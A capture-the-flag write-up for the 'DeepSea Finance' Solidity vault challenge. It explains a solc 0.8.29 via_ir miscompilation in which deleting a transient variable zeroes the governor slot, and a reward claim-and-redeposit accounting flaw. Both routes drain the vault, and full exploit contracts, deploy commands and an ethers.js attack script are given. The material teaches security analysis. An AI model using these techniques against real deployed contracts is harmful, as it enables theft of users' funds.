# DeepSea Finance — Writeup

## 1. Condition

```solidity
function isSolved() external view returns (bool) {
    return wbtc.balanceOf(address(vaultProxy)) == 0;
}
```

On deployment, `Setup` mints `10e8` WBTC (10 WBTC) to the vault proxy and `10e6` USDC (10 USDC) to the player. Goal: drain the vault's WBTC balance to zero.

---

## 2. Asset Exit Vectors

| Path | Restriction |
|------|-------------|
| `withdraw()` | Requires deposits |
| `borrow()` | Requires sufficient collateral |
| `liquidate()` | Requires unhealthy position |
| `flashLoan()` | Requires repayment |
| `settleAsset()` | Requires relay flag (blocked by reserved route check) |
| `emergencyWithdraw()` | **Requires guardian role** |
| `recoverERC20()` | Requires guardian role |

Conventional paths are blocked by collateral ratios, flashloan repayment checks, or guardian permissions. The player's 10 USDC at 75% LTV can only borrow ~7.5 USDC worth of WBTC — far from draining 10 WBTC.

`settleAsset()` requires `processTranscript()` to open the transient relay flag, but the relay auth route is already blocked by `commitCrossChainState()`'s reserved route check.

**Key insight**: Becoming a guardian allows direct WBTC withdrawal via `emergencyWithdraw()`.

---

## 3. Initialization Lock

Guardians are set during `initialize()`:

```solidity
function initialize(
    address _oracle,
    address _rewardToken,
    address[] calldata _guardians
) external {
    require(governor == address(0), "Already initialized");
    governor    = msg.sender;
    priceOracle = IVaultOracle(_oracle);
    rewardToken = _rewardToken;
    ...
}
```

The proxy is already initialized after deployment, so `governor != address(0)`. **Goal becomes: zero out `governor`.**

---

## 4. Compiler Configuration

`foundry.toml`:

```toml
solc_version = "0.8.29"
via_ir = true
evm_version = "cancun"
```

The code uses transient storage:

```solidity
address internal transient _epochAnchor;
address internal transient _epochOperator;
```

Transient storage and regular storage are separate storage spaces. The correct semantics of `delete _epochOperator` should be clearing transient storage, not writing to regular storage.

---

## 5. Bug Trigger

`claimRewards()` → `_settleRewardEpoch()` → `_finalizeRewardEpoch()`:

```solidity
function claimRewards(address token) external nonReentrant {
    _settlePendingRewards(msg.sender, token);
    ...
    _settleRewardEpoch(token);
}

function _settleRewardEpoch(address token) internal {
    bytes32 epochId = keccak256(abi.encodePacked(token, block.chainid));
    _stageRewardOperator(epochId);
    _finalizeRewardEpoch(msg.sender);
}

function _finalizeRewardEpoch(address operator) internal {
    _epochOperator = operator;   // TSTORE (correct)
    delete _epochOperator;       // SSTORE slot 1 (BUG!)
}
```

`claimRewards()` doesn't require actual pending rewards — calling it is enough to reach `_finalizeRewardEpoch()`.

---

## 6. IR Evidence

```bash
forge inspect src/vault/DeepSeaVault.sol:DeepSeaVault irOptimized
```

`_finalizeRewardEpoch()` related IR snippet:

```text
update_transient_storage_value_offset_address_to_address(0x01, expr)
storage_set_to_zero_address(0x01, 0)
```

- Line 1: `_epochOperator = operator` uses transient write (correct)
- Line 2: `delete _epochOperator` is miscompiled as regular storage slot 1 clear

Storage layout:

```text
slot 0: ReentrancyGuard._status
slot 1: DeepSeaVault.governor    ← zeroed!
slot 2: priceOracle
slot 3: rewardToken
slot 4: _pendingRewardOperator
```

Under solc 0.8.29 + `via_ir` mode, `delete` on a transient variable has a compilation bug: it generates `SSTORE(slot1, 0)` instead of `TSTORE`. Slot 1 happens to be `governor`.

---

## 7. Exploit Chain (Intended)

1. Call `vault.claimRewards(wbtc)` → triggers compiler bug → zeros `governor`
2. Call `vault.initialize(...)` → re-initializes, exploit contract becomes guardian
3. Call `vault.emergencyWithdraw(wbtc, player, fullBalance)` → drains all WBTC
4. `isSolved()` returns `true`

### Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import "../DeepSea Finance/src/Setup.sol";
import "../DeepSea Finance/src/vault/DeepSeaVault.sol";

contract Exploit {
    constructor(Setup setup, address player) {
        DeepSeaVault vault = setup.vaultProxy();
        address wbtc = address(setup.wbtc());

        // Step 1: Trigger compiler bug, zero governor
        vault.claimRewards(wbtc);

        // Step 2: Re-initialize, become guardian
        address[] memory guards = new address[](1);
        guards[0] = address(this);
        vault.initialize(
            address(setup.oracle()),
            address(setup.usdc()),
            guards
        );

        // Step 3: Drain all WBTC
        vault.emergencyWithdraw(
            wbtc,
            player,
            setup.wbtc().balanceOf(address(vault))
        );

        require(setup.isSolved(), "not solved");
    }
}
```

### Reproduce

```bash
# Deploy exploit
forge create \
  --rpc-url "$RPC_URL" \
  --private-key "$PLAYER_KEY" \
  --broadcast \
  exp/Exploit.sol:Exploit \
  --constructor-args "$SETUP" "$PLAYER"

# Verify
cast call "$SETUP" "isSolved()(bool)" --rpc-url "$RPC_URL"
# Returns true
```

---

## 8. Unintended Exploit: Reward Accounting Economic Bug

When hiding the compiler bug, some vulnerabilities were intentionally planted — for example, the player could obtain all USDC, since 60010 × 0.75 is still not enough to borrow all WBTC. However, one issue was overlooked.

The reward rate was set too high:

```solidity
vaultProxy.addMarket(address(usdc),  5, 1e14);
```

Reward claims don't mint new tokens — they directly transfer from the vault:

```solidity
function claimRewards(address token) external nonReentrant {
    _settlePendingRewards(msg.sender, token);
    UserPosition storage pos = positions[msg.sender][token];
    uint256 amt = pos.pendingRewards;
    if (amt > 0 && IERC20(rewardToken).balanceOf(address(this)) >= amt) {
        pos.pendingRewards = 0;
        rewardToken.safeTransfer(msg.sender, amt); // rewards transferred directly from vault
    }
    _settleRewardEpoch(token);
}
```

The problem is that in the `deposit()` function, accounting and balance are decoupled:

```solidity
function deposit(address token, uint256 amount) external nonReentrant {
    require(markets[token].enabled, "Market disabled");
    require(amount > 0, "Zero amount");
    _settlePendingRewards(msg.sender, token);
    token.safeTransferFrom(msg.sender, address(this), amount);

    UserPosition storage pos       = positions[msg.sender][token];
    pos.deposited                 += amount;
    pos.lastActivityBlock          = block.number;
    markets[token].totalDeposited += amount;
    emit Deposited(msg.sender, token, amount);
}
```

`deposit()` only increases the user's deposited bookkeeping, but after repeated claim→deposit loops it can be inflated arbitrarily, making the collateral value surpass the intended cap of 600010 * 0.75; and the final borrow validation uses this same value.

```solidity
uint256 colValueUSD = _assetValueUSD(collateralToken, pos.deposited); // USDC collateral USD value
```

### Exploit Code

```javascript
const { ethers } = require("ethers");
const solc = require("solc");

// ── ABIs ─────────────────────────────────────────────────────────────

const setupAbi = [
  "function vaultProxy() view returns (address)",
  "function wbtc() view returns (address)",
  "function usdc() view returns (address)",
  "function isSolved() view returns (bool)",
];

const vaultAbi = [
  "function deposit(address token, uint256 amount) external",
  "function borrow(address borrowToken, address collateralToken, uint256 borrowAmount) external",
];

const erc20Abi = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
];

// ── Solidity helper contracts (compiled with viaIR) ──────────────────

const source = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IVault {
    function deposit(address token, uint256 amount) external;
    function claimRewards(address token) external;
    function borrow(address borrowToken, address collateralToken, uint256 borrowAmount) external;
}

contract Helper {
    function depositToVault(address vault, address token, uint256 amount) external {
        IERC20(token).approve(vault, type(uint256).max);
        IVault(vault).deposit(token, amount);
    }

    function claimAndDeposit(address vault, address rewardMarketToken, address rewardToken) external {
        IVault(vault).claimRewards(rewardMarketToken);
        uint256 bal = IERC20(rewardToken).balanceOf(address(this));
        IERC20(rewardToken).approve(vault, type(uint256).max);
        IVault(vault).deposit(rewardToken, bal);
    }

    function borrowFromVault(address vault, address borrowToken, address collateralToken, uint256 amount) external {
        IVault(vault).borrow(borrowToken, collateralToken, amount);
    }
}

contract Manager {
    Helper[] public helpers;

    constructor(uint256 n) {
        for (uint256 i = 0; i < n; i++) {
            helpers.push(new Helper());
        }
    }

    function helper(uint256 i) external view returns (address) {
        return address(helpers[i]);
    }

    function splitAndDeposit(
        address vault,
        address token,
        uint256 totalAmount,
        uint256 eachAmount
    ) external {
        IERC20(token).transferFrom(msg.sender, address(this), totalAmount);
        for (uint256 i = 0; i < helpers.length; i++) {
            IERC20(token).transfer(address(helpers[i]), eachAmount);
            helpers[i].depositToVault(vault, token, eachAmount);
        }
    }
}
`;

// ── Helpers ──────────────────────────────────────────────────────────

function usage() {
  console.error("Usage:");
  console.error("  node exp2.js <rpcUrl> <playerPrivateKey> <setupAddress>");
  console.error("");
  console.error("Or set environment variables:");
  console.error("  RPC_URL, PLAYER_KEY, SETUP_ADDRESS");
}

function getConfig() {
  const [, , argRpc, argKey, argSetup] = process.argv;
  const rpcUrl = argRpc || process.env.RPC_URL;
  const playerKey = argKey || process.env.PLAYER_KEY;
  const setupAddress = argSetup || process.env.SETUP_ADDRESS;

  if (!rpcUrl || !playerKey || !setupAddress) {
    usage();
    process.exit(1);
  }
  if (!ethers.isAddress(setupAddress)) {
    throw new Error(`invalid setup address: ${setupAddress}`);
  }
  return { rpcUrl, playerKey, setupAddress };
}

function compile() {
  const input = {
    language: "Solidity",
    sources: { "Attack.sol": { content: source } },
    settings: {
      optimizer: { enabled: true, runs: 200 },
      viaIR: true,
      outputSelection: { "*": { "*": ["abi", "evm.bytecode.object"] } },
    },
  };

  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  if (output.errors) {
    const fatal = output.errors.filter((e) => e.severity === "error");
    for (const e of output.errors) console.log(e.formattedMessage);
    if (fatal.length) throw new Error("solc compilation failed");
  }

  return {
    managerAbi: output.contracts["Attack.sol"].Manager.abi,
    managerBytecode: output.contracts["Attack.sol"].Manager.evm.bytecode.object,
    helperAbi: output.contracts["Attack.sol"].Helper.abi,
  };
}

async function send(txPromise, label) {
  const tx = await txPromise;
  const receipt = await tx.wait();
  console.log(`${label}: ${tx.hash} @ block ${receipt.blockNumber}`);
  return receipt;
}

// ── Exploit ──────────────────────────────────────────────────────────

async function main() {
  const { rpcUrl, playerKey, setupAddress } = getConfig();
  const { managerAbi, managerBytecode, helperAbi } = compile();

  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const wallet = new ethers.Wallet(playerKey, provider);
  const setup = new ethers.Contract(setupAddress, setupAbi, wallet);

  const vaultAddr = await setup.vaultProxy();
  const wbtcAddr = await setup.wbtc();
  const usdcAddr = await setup.usdc();
  const vault = new ethers.Contract(vaultAddr, vaultAbi, wallet);
  const wbtc = new ethers.Contract(wbtcAddr, erc20Abi, wallet);
  const usdc = new ethers.Contract(usdcAddr, erc20Abi, wallet);

  // 1. Deploy helper manager (10 helper contracts)
  const managerFactory = new ethers.ContractFactory(managerAbi, managerBytecode, wallet);
  const manager = await managerFactory.deploy(10);
  await manager.waitForDeployment();
  const managerAddr = await manager.getAddress();
  const helperAddr = await manager.helper(1);

  // 2. Deposit 10 USDC as collateral
  await send(usdc.approve(vaultAddr, 10_000_000n), "approve usdc");
  await send(vault.deposit(usdcAddr, 10_000_000n), "deposit 10 USDC");

  // 3. Borrow 12,000 sat WBTC (max at 75% LTV)
  await send(vault.borrow(wbtcAddr, usdcAddr, 12_000n), "borrow 0.00012 WBTC");

  // 4. Split WBTC across 10 helpers and deposit into vault
  await send(wbtc.approve(managerAddr, 12_000n), "approve seed wbtc");
  await send(
    manager.splitAndDeposit(vaultAddr, wbtcAddr, 12_000n, 1_200n),
    "split seed WBTC to 10 helpers"
  );

  // 5. Claim USDC rewards + re-deposit, 8 rounds
  //    Each round: helper claims ~100,000 USDC (1 block of WBTC market rewards)
  //    and re-deposits it as collateral. Vault USDC balance stays constant
  //    (claim -100k, deposit +100k), so the cycle can repeat indefinitely.
  const helper = new ethers.Contract(helperAddr, helperAbi, wallet);
  for (let i = 0; i < 8; i++) {
    await send(
      helper.claimAndDeposit(vaultAddr, wbtcAddr, usdcAddr),
      `claim+redeposit round ${i + 1}`
    );
  }

  // 6. Borrow all 10 WBTC (800k USDC collateral × 75% LTV = 600k USD = 10 WBTC)
  await send(
    helper.borrowFromVault(vaultAddr, wbtcAddr, usdcAddr, 1_000_000_000n),
    "borrow all vault WBTC"
  );

  console.log("solved =", await setup.isSolved());
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
```
